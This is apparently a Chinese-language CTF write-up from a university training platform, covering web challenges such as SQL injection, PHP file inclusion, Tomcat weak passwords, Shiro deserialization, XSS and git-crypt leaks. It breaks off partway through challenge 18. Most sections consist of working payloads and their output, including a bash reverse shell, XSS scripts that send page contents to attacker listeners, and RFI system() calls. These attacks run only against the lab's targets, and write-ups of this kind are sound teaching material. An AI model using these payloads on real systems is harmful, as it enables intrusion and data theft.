---
level: secret
---

# ZJU School-Bus

websocat连接容器

```
websocat -b -E tcp-l:127.0.0.1:61234 wss://zjusec.com/api/v1/proxy/16ef3ad8-c149-46b8-b352-137e4f0692ce --socks5 127.0.0.1:11080
```

>  complete:34/34
>  score:8296/8296​
>  

- [x] git leak
- [x] SQL injection
- [x] EasyWeb
- [x] Scan
- [x] php include
- [x] dangerous flask
- [x] War of tomcat
- [x] flag403
- [x] WebCompany
- [x] delete injection
- [x] babyshiro
- [x] babyxss
- [x] childxss
- [x] Quinelt
- [x] 大乌龟找妈妈
- [ ] 日哭school-bus *
- [ ] 上了那个writeup *
- [x] CY的魔幻之旅
- [x] 义磊奇侠传
- [x] SSRF
- [x] ARITHMETIC CAPTCHA
- [x] Supervisor
- [x] WordPress
- [x] html2pdf
- [x] html2pdf_nonet
- [x] 未完成的网站
- [ ] 未完成的网站 升级版
- [ ] Baby Hash *
- [ ] Calc *
- [ ] Child Hash *
- [ ] Grownup Hash *
- [ ] Another_Calc *
- [x] re0
- [x] master of math
- [x] baby SSRF
- [x] easy blade
- [x] easy servlet
- [x] easy sql
- [x] 山雀
- [x] Upload?
- [x] ezphishing
- [x] Aviator

上面有些题目暂时无法打开

### {1} git leak

先用dirsearch扫描一遍，发现git泄露

直接用GitHack还原index.php

```
if(isset($_POST["flag"])){    if(md5($_POST["flag"])==="294897c13f44d2cbb6108daf63e22f70") echo "True. Attention: The real flag is AAA{*_qq_qun_38 6796080}, the * is what you input.";    else{ echo "Wrong.";} }
```

用md5网站解密一下就是Git1e

> 提示的文章下架了，建议更新



### {2} SQL injection

先用splmap扫一遍，证明漏洞存在

然后--dbs扫一遍数据库

```
available databases [2]:
aaa_web2
information_schema

sqlmap -u http://10.214.160.13:10002/?questionid=1 -D aaa_web2 -T flag_is_here --columns
```

```
+------------------+--------------+
| Column           | Type         |
+------------------+--------------+
| an_extra_message | varchar(255) |
| author           | varchar(255) |
| flag             | varchar(255) |
+------------------+--------------+
```

```powershell
sqlmap -u http://10.214.160.13:10002/?questionid=1 -D aaa_web2 -T flag_is_here -C flag --dump
```

拿到flag

AAA{welc0me_to_AAA_Congratu1ationS_qq_group_386796080}

这个不是Flag,只是秀个恩爱（甚至还有彩蛋）



### {3} Easy Web

> 熟练掌握chrome开发人员工具

/1.php.bak自动下载源码

源码里面有第二关的位置

```
<a href="the2nd.php">进入第二关</a>
```

第二关提交表单之后能看到第三关的地址3rd.php，但是有弹窗拦截“你从哪里来”

用HackBar进行xss注入

```
text=<script>location.href='3rd.php'</script>
```

成功进入第三关，有一个按钮“你又要到哪里去”

点击进入第四关“茫茫醉乡中 天下心中藏 下一关的地址在哪儿？就在你的眼皮底下~”

用BurpSuite抓包查看请求头

```
Next: wozaizheli.php
```

最后一关直接用HackBar注入HIT=HIT即可

```
flag: AAA{y0u_2a_g0od_front-end_Web_developer}
```



### {4} Scan

扫描端口，需要用到proxychains等工具

访问本题请通过本地运行 ssh user@10.214.160.13 -p 10802 -D 10899 -N，并输入密码 sbus 来开启在本机 10899 端口的 SOCKS5 服务，以下所有域名均应在 SOCSK5 代理后才可访问(可以使用 proxychains4 等工具)。

part 1：web5 端口扫描

扫描zju.tools(192.168.192.3)的9000-11000端口，找到ssh端口

```
proxychains4 nmap -sT -p 9000-11000 -Pn -vv --open -n 192.168.192.3
```

```
PORT      STATE SERVICE REASON
10822/tcp open  unknown syn-ack
```

访问attackme.zjupy.trade(192.168.192.8)+10822(扫描出来的端口号)

```
curl --socks5-hostname 127.0.0.1:10899 http://192.168.192.8:10822/
# 得到flag(没什么用)
AAA{web5_part1_passed_and_welcome_to_aaa_qq_group_386796080}
```

part 2:目录爆破

Q: 什么是目录爆破? 为什么要爆破目录?
A: 正常情况下, 网站的某些目录是没有直接进入的入口的, 比如
  www.foo.com/secret/admin.php
  <del>melody.com/resource/小电影.torrent</del>
  这些隐藏的目录可能会给攻击带来很大的方便, 提供网站的更多信息或者增加攻击面.
  目录爆破就是根据一个庞大的字典, 来一个个测试这个目录是否存在. 当然还会加上爬虫的辅助

Q: 使用什么工具?
A: DirBuster 或者它的集成版 Zap (看喜好, zap整体功能比较强, 但是就扫目录这个功能上可定制性比较差)
  burpsuite也可以用于目录爆破

Q: 目录字典呢?
A: DirBuster(0.12) 自带目录字典, zap被阉割了, 如果是用zap的话请下载DirBuster里面的目录字典
  在本次扫描中, 为了减轻服务器压力, 请使用 directory-list-lowercase-2.3-small.txt （名字不太对）这个

Hints:
  本次扫描中, 只会出现 .html 后缀的文件
  目录爆破可能需要非常长的时间, 请耐心等待(*ˉ︶ˉ*)

先下载SecList

```
git -c http.proxy=http://127.0.0.1:7890 clone --depth=1 https://github.com/danielmiessler/SecLists.git
```

然后用diresearch进行爆破（前面记得套一层proxychains4）

```
proxychains4 dirsearch -u http://192.168.192.8:10822/ \
  -w /home/lry/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt \
  -e html
```

```
less ~/.dirsearch/reports/192.168.192.8-10822/-_25-11-26_03-18-02.txt
```

```
301   170B   http://192.168.192.8:10822/bbs    -> REDIRECTS TO: http://192.168.192.8/bbs/
301   170B   http://192.168.192.8:10822/config    -> REDIRECTS TO: http://192.168.192.8/config/
301   170B   http://192.168.192.8:10822/sex    -> REDIRECTS TO: http://192.168.192.8/sex/
301   170B   http://192.168.192.8:10822/flag    -> REDIRECTS TO: http://192.168.192.8/flag/
301   170B   http://192.168.192.8:10822/a4    -> REDIRECTS TO: http://192.168.192.8/a4/
301   170B   http://192.168.192.8:10822/secret    -> REDIRECTS TO: http://192.168.192.8/secret/
301   170B   http://192.168.192.8:10822/bonus    -> REDIRECTS TO: http://192.168.192.8/bonus/
301   170B   http://192.168.192.8:10822/phpmyadmin    -> REDIRECTS TO: http://192.168.192.8/phpmyadmin/
301   170B   http://192.168.192.8:10822/melodies    -> REDIRECTS TO: http://192.168.192.8/melodies/
301   170B   http://192.168.192.8:10822/phpinfo    -> REDIRECTS TO: http://192.168.192.8/phpinfo/
```

```
sex/index.html
（原文是base64,笑死我了）
以热爱祖国为荣
以危害祖国为耻
以服务人民为荣
以背离人民为耻
以崇尚科学为荣
以愚昧无知为耻
以辛勤劳动为荣
以好逸恶劳为耻
以团结互助为荣
以损人利己为耻
以诚实守信为荣
以见利忘义为耻
以遵纪守法为荣
以违法乱纪为耻
以艰苦奋斗为荣
以骄奢淫逸为耻

```

```
flag/index.html
Flag不在这里, 请继续 :)
```

```
config/index.html
database = zjutools_mysql
user = ztdb_user
password = FKgSMUaN2CZA7xW6
host = 127.0.0.1
port = 3306
default-character-set = utf8
```

```
phpmyadmin/index.html
AAA{Earth_Three-body-Organization}
我真的服了，很难想象出题人的精神状态
```



### {5} php include

上传自己的一句话木马文件（1.php）发现只返回了

```
啊不要这样子对人家啦～
```

利用官方支持的方式查看file.php的源码

```
http://10.214.160.13:10001/index.php?f=php://filter/convert.base64-encode/resource=file.php
```

返回base64编码，进行转换：

```php
<?php
$filetype=["jpg","gif","png","rar","zip"];
if ($_FILES["file"]["error"] > 0){
    echo "上传错误！<br />";
} else {
    $file_type = explode(".",$_FILES["file"]["name"]);
    if (in_array($file_type[count($file_type)-1],$filetype)){
        if ($_FILES["file"]["size"] > 2000000){
            echo "文件太大<br />";
        } else {
            $filename = date('Ymd').rand(100000,999999).".".$file_type[count($file_type)-1];
            if (file_exists("upload/" . $filename)){
                echo $filename . " 已存在 ";
            } else {
                move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $filename);
                echo "Stored in: upload/".$filename;
            }
        }
    } else {
        echo "类型不允许";
    }
}
?>
```

发现过滤了php文件的上传，于是直接改后缀为1.php.jpg绕过文件类型检查，得到路径

```
Stored in: upload/20251127882979.jpg
```

用中国木马后得到flag

```
<?php
	$flag="AAA{m310dy_1s_wAitinG_4_y0u_h3r3_qq_qun_386796080}";
?>
```



### {6} dangerous flask

>  开启了Debug=True的flask框架有多么危险呢？

```
抓包发现返回头Server: Werkzeug/2.3.6 Python/3.8.17
说明是flask
```

页面里的正常值是

```
{"choice": "kazusa"}
{"choice": "setsuna"}
```

直接用HackBar提交一个非法的json

```
data={"choice": "aaa",
```

返回的报错页面里就有flag

```
choice = json.loads(data).get('choice')  # Flag: Congrats! 
Flag: AAA{haruki_SH4b1_qq_qun_386796080}
```



### {7} War of tomcat

>flag 在 /usr/local/tomcat/conf/tomcat-users.xml 
>这个题目考察tomcat弱密码，在manager页面可以上传war呢
>本题flag为melody用户的密码，上传文件每半个小时会被清理

Tomcat 服务器是一个开源的轻量级Web应用服务器，在中小型系统和并发量小的场合下被普遍使用，是开发和调试Servlet、JSP 程序的首选

Tomcat主要组件：服务器Server，服务Service，连接器Connector、容器Container， 连接器Connector和容器Container是Tomcat的核心

先去/manager，不出所料跳出输入用户名和密码的界面

Tomcat 的 `/manager/html` 使用的是最基础的 **Basic Authentication**。这个认证方式没有验证码、没有锁定机制 → 所以容易被弱密码破解。

```
尝试以下组合
admin:admin
tomcat:tomcat →成功，后面就不试了
manager:manager
admin:password
tomcat:s3cret
root:root
```

进入/manager/html后找到WAR file to deploy

构建一个exploit.war

```
# read.jsp内容：

<%@ page import="java.nio.file.*" %>
<%
String p = "/usr/local/tomcat/conf/tomcat-users.xml";
out.println("<pre>");
try {
    byte[] b = Files.readAllBytes(Paths.get(p));
    out.println(new String(b, "UTF-8"));
} catch (Exception e) {
    out.println("ERROR: " + e.getMessage());
}
out.println("</pre>");
%>
```

部署之后进入

```
http://10.214.160.13:10007/exploit/read.jsp
```

查看网页源代码，得到flag

```xml
<pre>
<?xml version='1.0' encoding='utf-8'?>
...
  <role rolename="manager-gui"/>
  <role rolename="admin-gui"/>
  <user username="tomcat" password="tomcat"  roles="manager-gui"/>
  <user username="melody" password="AAA{t0mcat_wiTh_manager_1s_dangerous_qq_GROUP_386796080}"/>
</tomcat-users>
</pre>
```



### {8} flag403

这是我耗时非常长的一道题目，感觉不难，但其实有很多玄机，需要对git-crypt有比较深入的理解

> Nginx conf:
>
> ```
> location / {
>     root /var/www/html;
>     location = /flag.txt {
>         deny all;
>     }
> }
> ```
>
> flag is [here](http://10.214.160.13:10017/flag.txt).

首先尝试路径绕过（被误导了好久），发现只是一个幌子

用dirsearch扫了一下发现有git泄露，或许可以从git入手

```
[03:01:04] 301 -  185B  - /.git  ->  http://10.214.160.13/.git/
[03:01:04] 403 -  571B  - /.git/
[03:01:04] 403 -  571B  - /.git/branches/
[03:01:04] 200 -   23B  - /.git/HEAD
[03:01:04] 200 -   73B  - /.git/description
[03:01:04] 200 -   12B  - /.git/COMMIT_EDITMSG
[03:01:04] 200 -  241B  - /.git/config
[03:01:04] 403 -  571B  - /.git/hooks/
[03:01:04] 200 -  240B  - /.git/info/exclude
[03:01:04] 200 -  297B  - /.git/index
[03:01:04] 403 -  571B  - /.git/logs/
[03:01:04] 403 -  571B  - /.git/info/
[03:01:04] 301 -  185B  - /.git/logs/refs/heads  ->  http://10.214.160.13/.git/logs/refs/heads/
[03:01:04] 200 -  163B  - /.git/logs/HEAD
[03:01:04] 200 -  163B  - /.git/logs/refs/heads/master
[03:01:04] 301 -  185B  - /.git/logs/refs  ->  http://10.214.160.13/.git/logs/refs/
[03:01:04] 403 -  571B  - /.git/objects/
[03:01:04] 301 -  185B  - /.git/refs/heads  ->  http://10.214.160.13/.git/refs/heads/
[03:01:04] 200 -   41B  - /.git/refs/heads/master
[03:01:04] 403 -  571B  - /.git/refs/
[03:01:04] 301 -  185B  - /.git/refs/tags  ->  http://10.214.160.13/.git/refs/tags/
[03:01:04] 200 -   41B  - /.gitattributes
[03:01:13] 403 -  571B  - /flag.txt
[03:01:14] 200 -  160B  - /index.html
```

查看一下提交

```
lry@LRY:~/tools/GitHack/10.214.160.13_10017$ curl -i http://10.214.160.13:10017/.git/logs/HEAD
HTTP/1.1 200 OK
Server: nginx/1.11.1
Date: Mon, 08 Dec 2025 14:32:54 GMT
Content-Type: application/octet-stream
Content-Length: 163
Last-Modified: Thu, 21 Jun 2018 08:31:21 GMT
Connection: keep-alive
ETag: "5b2b6259-a3"
Accept-Ranges: bytes

0000000000000000000000000000000000000000 79973e2caf360c14f419961b37b4983953f7c9a3 zjuchenyuan <chenyuan@zju.edu.cn> 1529569879 +0800    commit (initial): add website
```

用GitHack还原之后发现flag.txt是二进制文件，并且是git-crypt 加密过的文件

```
lry@LRY:~/tools/GitHack/10.214.160.13_10017$ xxd flag.txt
00000000: 0047 4954 4352 5950 5400 9202 3373 54c1  .GITCRYPT...3sT.
00000010: 7ad7 2a20 8d07 3021 84c0 f0bd 41f8 29d1  z.* ..0!....A.).
00000020: 2599 80dd 6dcf 2df8 5f45 b829 89ba f14e  %...m.-._E.)...N
00000030: f8ed 9258 df58 96ba 4e8b 6efc c6c2 dcfc  ...X.X..N.n.....
00000040: ba4b c4c3 a142 39e1 24fe 4d15 548a f1f0  .K...B9.$.M.T...
00000050: ce41 9082 ae6f 2bb6 9256 2bea e0c3       .A...o+..V+... 
```

git-crypt是一款第三方开源软件，可以用于对Git仓库中的文件进行透明化的加密和解密。

一般来说git-crypt的key是有默认地址的，但是没有显示，用curl发现可访问

```
lry@LRY:~$ curl -i http://10.214.160.13:10017/.git/git-crypt/keys/default
HTTP/1.1 200 OK
Server: nginx/1.11.1
Date: Sat, 06 Dec 2025 13:17:02 GMT
Content-Type: application/octet-stream
Content-Length: 148
Last-Modified: Thu, 21 Jun 2018 08:27:22 GMT
Connection: keep-alive
ETag: "5b2b616a-94"
Accept-Ranges: bytes

Warning: Binary output can mess up your terminal. Use "--output -" to tell
Warning: curl to output it to your terminal anyway, or consider "--output
Warning: <FILE>" to save to a file.

lry@LRY:~$ curl http://10.214.160.13:10017/.git/git-crypt/keys/default --output gitcrypt_key
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   148  100   148    0     0   9621      0 --:--:-- --:--:-- --:--:--  9866
```

拿到key了之后又卡了很久，想要直接用git-crypt unlock的，但是网站并没有泄露git，又尝试暴力破解无果

后来想到可以自己新建一个git仓库来伪装成原仓库，只要flag.txt的Bolb Hash是对的就可以了，因为git-crypt只针对git文件

```
通过已知Bolb的进行不断推进
curl http://10.214.160.13:10017/.git/79/973e2caf360c14f419961b37b4983953f7c9a3 --output 1
拿到了tree的SHA-1 哈希值
eacab84bb4894a680bb829bf8344b996da51eb81
http://10.214.160.13:10017/.git/79/973e2caf360c14f419961b37b4983953f7c9a3 --output 2
下载后进行解压
python3 -c "
import zlib, sys
compressed_data = sys.stdin.buffer.read()
sys.stdout.buffer.write(zlib.decompress(compressed_data))
" < 2 > uncompressed_tree_py
```

拿到flag.txt的Blob哈希值：

```
2d1681fb3fe25c25598c4dfea20badb63905557c
```

新建仓库并使用git-crypt

```
mkdir flag_repo
cd flag_repo
git init
---
# 重建路径
mkdir -p .git/objects/${FLAG_SHA1:0:2}
curl http://10.214.160.13:10017/.git/objects/${FLAG_SHA1:0:2}/${FLAG_SHA1:2} --output flag_blob_compressed
mv ../flag_blob_compressed .git/objects/2d/1681fb3fe25c25598c4dfea20badb63905557c
---
# 模式 100644 表示普通文件
git update-index --add --cacheinfo 100644 ${FLAG_SHA1} flag.txt
---
# 创建一次提交
git commit -m "add flag.txt"
---
# 很关键，.gitattributes是让git-crypt知道flag.txt是被加密过的
echo "flag.txt filter=git-crypt diff=git-crypt" > .gitattributes
git-crypt unlock /home/lry/gitcrypt_key
---
cat flag.txt
```

拿到flag

```
AAA{flag_ix2mkbPEX3bmkHSB_gitcrypt_is_not_that_secure_qqgroup_386796080}
```



### {9} WebCompany

> hint：php版本为5.2.17，php.ini有一项危险的On

想看一下index.php的源码，结果发现报错信息

```
http://10.214.160.13:10006/index.php?p=php://filter/convert.base64-encode/resource=index

Warning: include(php://filter/convert.base64-encode/resource=index.page.php) [<a href='function.include'>function.include</a>]: failed to open stream: operation failed in /usr/local/apache2/htdocs/index.php on line 17
```

得到warning，既然有一个危险的On，猜测是allow_url_include=On（打开远程文件包含）

RFI（Remote File Inclusion）远程文件包含漏洞

意味着 PHP 的 `include` / `require` 可以加载 URL，除了正常 URL，还能加载这些伪协议：

```
http://,ftp://,data://,php://input
```

因为我比较懒，选择直接用data:// 伪协议

```
p=data://text/plain,XXX
不去读真正的文件（例如 services.page.php）
而是把 “XXX 里的内容” 当作文件内容喂给 include()
```

但是遇到了一个小问题，从上面的warning可以猜测include的逻辑大概是

```
include($_GET['p'] . ".page.php");
```

比如我在尝试构造php代码时，后面会被加上.page.php，导致报错

```
<?php echo 'YES_RFI'; ?>
<?php echo 'YES_RFI'; ?>.page.php
```

但是hint里面还有一个提示php版本为5.2.17

搜索发现php<5.3的版本有漏洞，`?>...（任何内容）` 均不会被解析为 PHP

```
<?php echo 'YES_RFI'; ?>?>.page.php
# 执行效果如下，?>.page.php被当作纯文本输出
YES_RFI?>.page.php
```

尝试列目录找线索

```
curl -s --get --data-urlencode "p=data://text/plain,<?php system('ls -la /usr/local/apache2/htdocs');?>?>" "http://10.214.160.13:10006/"

total 48
drwxr-xr-x  5 root root 4096 Oct 27  2016 .
drwxr-sr-x 25   33   33 4096 Oct 27  2016 ..
-rw-r--r--  1 root root  248 Aug  3  2016 accueil.page.php
-rw-r--r--  1 root root  207 May 11  2013 config.php
-rw-r--r--  1 root root  549 May 11  2013 contact.page.php
-rw-r--r--  1 root root   63 Aug  3  2016 flag.php
drwxr-xr-x  2 root root 4096 Oct 27  2016 inc
-rw-r--r--  1 root root  583 May 11  2013 index.php
drwxr-xr-x  2 root root 4096 Oct 27  2016 lang
-rw-r--r--  1 root root  125 Aug  3  2016 lang.php
-rw-r--r--  1 root root  519 May 11  2013 services.page.php
drwxr-xr-x  2 root root 4096 Oct 27  2016 style
?>.page.php
```

发现flag.php文件后一样的方法进行读取

```
curl -s --get --data-urlencode "p=data://text/plain,<?php system('cat /usr/local/apache2/htdocs/flag.php'); ?>" "http://10.214.160.13:10006/"
```

拿到flag

```
<?php
 $flag="AAA{allow_url_include_1s_0n?!qq_qun_386796080}";
.page.php
```



### {10} delete injection

> Hint: WAF会拦截单引号；WAF会拦截ascii码不在31~127的字符
>
> delete注入题，绕过过滤和WAF，flag在数据库中的flag表 
>
> 核心代码(PHP)：
>
> ```
> $exp = stripcslashes($exp);   
> $sql = "delete from users where id=$id and message = '$exp';";
> ```

stripcslashes()函数会对反斜杠进行转义。

接下来就是构造playload

会出现以下两种情况：

* 被select|insert|update|delete|load_file过滤：

* WAF会拦截单引号；WAF会拦截ascii码不在31~127的字符

构造payload

```
updatexml(1,concat(0x7e,substr((elect group_concat(column_name) from information_schema.columns where table_name='flag'),1,31),0x7e),1)
```

构造payload，substr是因为lupdatexml 的报错信息长度限制为32 个字符。如果 flag 很长报错信息会把它截断，所以一般需要两次读取(1,31)和(32,31)

```
\x27 or \x75pdatexml(1,concat(0x7e,substr((\x73elect flag from flag),1,31),0x7e),1) or \x27
```

可以通过两次注入得到flag

```
|21|=>|\x27 or \x75pdatexml(1,concat(0x7e,substr((\x73elect flag from flag),1,31),0x7e),1) or \x27|
XPATH syntax error: '~AAA{maruto_mdzz_qq_qun_38679608'
XPATH syntax error: '~0}~'
AAA{maruto_mdzz_qq_qun_386796080}
```



### {11} babyshiro

https://blog.csdn.net/qq_43531669/article/details/129616909

由于使用了AES加密，利用该漏洞需要获取AES的加密密钥，在Shiro1.2.4版本之前AES的加密密钥为硬编码，其默认密钥的Base64编码后的值为 

````
kPH+bIxk5D2deZiIxcaaaA==
````

利用shiro_attack进行爆破

```
java -jar 文件名.jar
```

反弹shell

```
10.197.163.78
bash -c 'exec bash -i &>/dev/tcp/10.197.163.78/8000 <&1'
```

多次尝试无果之后用whoami命令发现只是普通用户www-data

于是直接用ls查看文件

```
bin
boot
core
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
readflag
root
run
sbin
shirodemo-1.0-SNAPSHOT.jar
srv
sys
tmp
usr
var
```

发现不能直接cat flag而是需要通过运行readflag读取

```
./readflag
AAA{shiro_is_so_easy_7kzbBMHamMXY27nXFuIV}execute this binary on the server to get the flag!
```

AAA{shiro_is_so_easy_7kzbBMHamMXY27nXFuIV}



### {12} babyxss

> flag is in the admin page.  hint1:通过sql注入获取到账号权限

先通过sql注入获得账号权限，需要username和password

首先用万能的 ' OR 1=1#

发现返回some special char found~，说明有一些基础的过滤

进行慢慢尝试和排查之后发现是对空格有过滤

在某些 SQL 语言中（特别是 MySQL），可以使用**内联注释** `/**/` 来代替空格，在数据库中会被解释为分隔符

```
'/**/OR/**/1=1/**/#
```

<img src="./images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-12-08%20043250.png" alt="屏幕截图 2025-12-08 043250" style="zoom:50%;" />

尝试一下，发现有字数限制（80）

```
<img src=http://10.195.253.231:8000/?f=+document.getElementById('flag').innerHTML>
```

后来尝试缩短但是也没有拿到数据，于是换一个思路，直接看

```
<svg/onload=fetch('//10.195.253.231:8000/?h='+btoa(document.body.innerHTML))>
```

返回结果

```
(base) PS C:\Users\lry> ncat -lvp 8000
Ncat: Version 7.98 ( https://nmap.org/ncat )
Ncat: Listening on [::]:8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 10.214.160.13:36520.
GET /?h=CiAgICAgICAgPGgxPldlbGNvbWUsIGFkbWluPC9oMT4KICAgICAgICA8cD5oZXJlIGFyZSBhbGwgbWVzc2FnZXM6PC9wPgogICAgICAgIDx0YWJsZSBib3JkZXI9IjEiIGNlbGxwYWRkaW5nPSI1IiBzdHlsZT0ibWFyZ2luOiBhdXRvOyI+CiAgICAgICAgICAgIDx0Ym9keT48dHI+CiAgICAgICAgICAgICAgICA8dGg+dXNlcjwvdGg+CiAgICAgICAgICAgICAgICA8dGg+bWVzc2FnZTwvdGg+CiAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgIDx0cj48dGQ+YWRtaW48L3RkPjx0ZD48c3ZnIG9ubG9hZD0iZmV0Y2goJy8vMTAuMTk1LjI1My4yMzE6ODAwMC8/aD0nK2J0b2EoZG9jdW1lbnQuYm9keS5pbm5lckhUTUwpKSI+PC9zdmc+PC90ZD48L3RyPiAgICAgICAgPC90Ym9keT48L3RhYmxlPgogICAgCgo= HTTP/1.1
Host: 10.195.253.231:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/106.0.5249.0 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:5000
Referer: http://127.0.0.1:5000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

base64解码：

```html
<h1>Welcome, admin</h1>
        <p>here are all messages:</p>
        <table border="1" cellpadding="5" style="margin: auto;">
            <tbody>
                <tr>
                    <th>user</th>
                    <th>message</th>
                </tr>
                <tr>
                    <td>admin</td>
                    <td><svg onload="fetch('//10.195.253.231:8000/?h='+btoa(document.body.innerHTML))"></svg></td>
                </tr>
            </tbody>
        </table>
```

body里面没有就访问head

```
<svg/onload=fetch('//10.195.253.231:8000/?h='+btoa(document.head.innerHTML))>
```

一样的步骤：

```html
<title>admin</title>
        <script>
            var flag = "AAA{babyxss_0aa1ZnpBIEaJDpDHnzYK}";
            console.log(flag);
        </script>
```

拿到flag

```
AAA{babyxss_0aa1ZnpBIEaJDpDHnzYK}
```



### {13} childxss

> When baby grows up....

发现SQL注入的过滤更加严格

```
waf:[',', ' ', 'union', 'insert', 'update', 'delete']
```

正常的注入会被检测

```
injection? it seems that you have no right acount
```

发现可以用时间盲注读取数据库

```sql
payload = f"-1'/**/||/**/(ASCII(SUBSTRING((SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=0x6d717474)/**/FROM/**/{i}/**/FOR/**/1))={j})/**/&&/**/sleep(1)/**/#"
```

发现存在users库

```
alias,invitation_code,mails,messages,user_devices,users
```

同样进行盲注得到账号

```
aaadmin,aadmin,admin,adminn,adminnn,klee
123456,123456,12345b,666bbb,123456,123456
```

随便选一个登录即可，发现上传有长度限制

```
length<=36
```

可以本地新建一个名字叫x的文件

```javascript
var pageContent = document.documentElement.outerHTML;
// 将 HTML 源码进行 Base64 编码
var encodedContent = btoa(unescape(encodeURIComponent(pageContent)));

fetch('https://webhook.site/0d68cd6b-3f1d-4c85-8fa4-caae2db7fba2', {
    method: 'POST',
    mode: 'no-cors',
    headers: {
        'Content-Type': 'text/plain'
    },
    body: encodedContent
});
```

地址可以进行极致的压缩

```python
python -c "import socket,struct; print(struct.unpack('!L', socket.inet_aton('10.196.145.22'))[0])"
180654358
```

然后发送留言，让admin回传html页面

```html
<script src=//180654358/x></script>
```

<img src="./images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-03-07%20154631.png" alt="屏幕截图 2026-03-07 154631" style="zoom:50%;" />

拿到flag

```
AAA{childxss_xL2wDaxDT3Af8GjdxijX}
```



### {14} Quinelt

> 你知道吗：其实Queencard是完全的韩式英文
>
> 使用vim从零手搓的网站！那么源码该在哪搞到呢？

给我启发的网站：https://www.anquanke.com/post/id/253570

老规矩，先扫一遍（其实也不需要扫）

```
Target: http://10.214.160.13:11019/

[09:24:31] Starting:
...
[09:24:32] 200 -   16KB - /.index.php.swp
[09:24:39] 200 -    0B  - /db.php
[09:24:41] 200 -    2KB - /index.php
[09:24:41] 200 -    2KB - /index.php/login/
[09:24:45] 403 -  281B  - /server-status
[09:24:45] 403 -  281B  - /server-status/
```

发现index.php的备份文件/.index.php.swp

.swp正好符合了题目中vim的描述，当用户意外退出的时候就会产生swp文件，直接恢复拿到源码

```
vim -r index.php.swp
```

然后开始看代码逻辑

首先是waf：两层过滤+单双引号

```sql
blacklist1 = [' ', '\t', '\r', '\n', '-', '`', '$', '[', ']']
blacklist2 = ['where','sleep','rlike','rpad','repeat','benchmark','substr','instr','where','having','case']
```

但是很容易绕过

最关键的还是Quine的利用，因为有一个很特别的校验，输入的要和返回的一样

```sql
if (sha1($row["username"]) === sha1($username) && sha1($row["password"]) === sha1($password)) { // one more check!!!
        if ($row['quineit'] === true || $row['quineit'] === "1")
            $YOU_GOT_IT = true; #die(getenv("FLAG"));
        else
            die("You are not a true Queeeeeeeeeeen!");
    }
    else die("username or password error!");
}
```

最后构造的payload如下，四列（ID,username,password,quineit）

```sql
username = 1
password = '/**/union/**/select/**/1,1,REPLACE(REPLACE('"/**/union/**/select/**/1,1,REPLACE(REPLACE(".",0x22,0x27),0x2e,"."),1%23"',0x22,0x27),0x2e,'"/**/union/**/select/**/1,1,REPLACE(REPLACE(".",0x22,0x27),0x2e,"."),1%23"'),1%23'
```

<img src="./images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-09%20184802.png" alt="屏幕截图 2026-02-09 184802" style="zoom:75%;" />

拿到flag

```
AAA{y0u_r_th3_trUe_Quine_C4rd}
```



### {15} 大乌龟找妈妈

直接f12看源代码

```
<!--Good Job! The first part is AAA{, the next part is also in this page, but maybe it has been encoded? Try to search for it!-->
```

Response头里面有端倪(1)

```
look: MFCEEM2YGNIXOWDXHU6Q====（结尾====是base32特征）
aDB3X3QwXw==（base64）
h0w_t0_（最终转换结果）
```

用dirsearch扫一下

```
[05:27:46] 200 -  575B  - /index.php
[05:27:50] 200 -  205B  - /register.php
[05:27:50] 200 -   67B  - /robots.txt
```

```
/robots.txt:
User-agent: *
Disallow: /turtl3_1s_h3r3.txt  -> 打开之后是摩斯密码，decode之后是F1ND_MY_S0N_
Disallow: /reg1ster.php
```

```
/register.php
Set-Cookie: haha=7768305f3472335f 
hint: this is not md5 string
从hex转换为wh0_4r3_
```

/reg1ster.php会重定向到register.php
于是使用命令行

```
curl -v http://10.214.160.13:10008/reg1ster.php

*   Trying 10.214.160.13:10008...
* Connected to 10.214.160.13 (10.214.160.13) port 10008 (#0)
> GET /reg1ster.php HTTP/1.1
> Host: 10.214.160.13:10008
> User-Agent: curl/7.81.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Moved Temporarily
< Server: nginx/1.11.1
< Date: Thu, 27 Nov 2025 03:06:06 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Location: register.php
<
* Connection #0 to host 10.214.160.13 left intact
r3t4rd3d}
```

乌龟有五个部分

```
/ 两个
/turtl3_1s_h3r3.txt 一个
/register.php 一个
/reg1ster.php 一个
```

最终拼成flag

```
AAA{h0w_t0_f1nd_my_s0n_wh0_4r3_r3t4rd3d}
```



### {18} CY的魔幻之旅

源代码

```php
<?php
    class aaaClass
    {
        private $question1 = '';
        private $question2 = 0;
        private $answer = '';
        function __construct()
        {
            print 'AP: CY，我要问你两个问题！';
            print '问题一：我的第一个问题是什么？'.$this->question1;
            print '问题二：我的第二个问题的回答是什么？'.$this->answer;
        }
        function __destruct()
        {
            eval($this->question2);
        }
        function __wakeup()
        {
            foreach(get_object_vars($this) as $k => $v) {
                $this->$k = null;
            }
        }
    }

    function aaa_unserialize($value){
        preg_match('/[oc]:\d+:/i', $value, $matches);
        if (count($matches)){
            return false;
        }
        return unserialize($value);
    }

    function aaa_curl($url){
        $ch = file_get_contents($url);
        return $ch;
    }

    function check_url($url){
        $check = parse_url($url);
        if(substr($url, 0, 21) !== "http://www.melodia.pw" || substr($url, 21, 1) === "@"){
            die("NONONO");
        }
        if( stripos($url, '172') === FALSE && stripos($url, '192') === FALSE && stripos($url, '10') === FALSE && stripos($url, 'localhost') === FALSE && stripos($url, '127') === FALSE)
            return $check["host"] === 'gov.cn';
        else
            return 0;
    }

    if(isset($_POST['url'])){
        $url = $_POST['url'];
